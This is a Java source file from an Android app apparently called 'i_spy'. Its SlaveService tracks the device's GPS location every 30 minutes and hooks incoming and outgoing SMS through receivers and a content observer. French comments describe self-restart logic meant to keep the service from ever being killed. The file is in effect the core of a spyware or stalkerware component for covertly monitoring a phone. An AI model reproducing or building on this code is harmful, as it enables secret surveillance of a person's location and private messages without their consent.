package com.um.asn.i_spy.services;

import android.app.IntentService;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Handler;
import android.support.annotation.Nullable;

import com.um.asn.i_spy.listeners.ConnectionListener;
import com.um.asn.i_spy.listeners.MessageReceiveListener;
import com.um.asn.i_spy.listeners.MessageSendListner;
import com.um.asn.i_spy.manager.PositionGPSManager;
import com.um.asn.i_spy.models.Phone;

public class SlaveService extends IntentService {

    private final long TIME_BETWEEN_GET_DATA_GPS_MS = 1000 * 60 * 30;
    private Handler handler = new Handler();
    private Phone phone;

    private final Runnable getGPS = new Runnable(){
        public void run(){
            try {
                System.out.println("Clock : try save Position");

                new PositionGPSManager(getApplicationContext(), phone).run();

                handler.postDelayed(this, TIME_BETWEEN_GET_DATA_GPS_MS);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    };

    public SlaveService() {
        super("SlaveService");
    }

    public void getPhone() {
        phone = new Phone();
        phone.loadWithFile(getApplicationContext());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        getPhone();
        handler.post(getGPS);
        // Pour enregistrer l'eventListner sur les changements de connexion (car deprecated dans Nougat)
        registerReceiver(new ConnectionListener(), new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
        // Pour enregistrer l'eventListner sur les sms reçus
        IntentFilter filtre = new IntentFilter();
        filtre.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(new MessageReceiveListener(), filtre);
        // Pour enregistrer l'eventListener sur les sms envoyés
        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, new MessageSendListner(new Handler(), getApplicationContext()));
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Empêche le service d'être kill
        sendBroadcast(new Intent("YouWillNeverKillMe"));
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        return;
    }
}
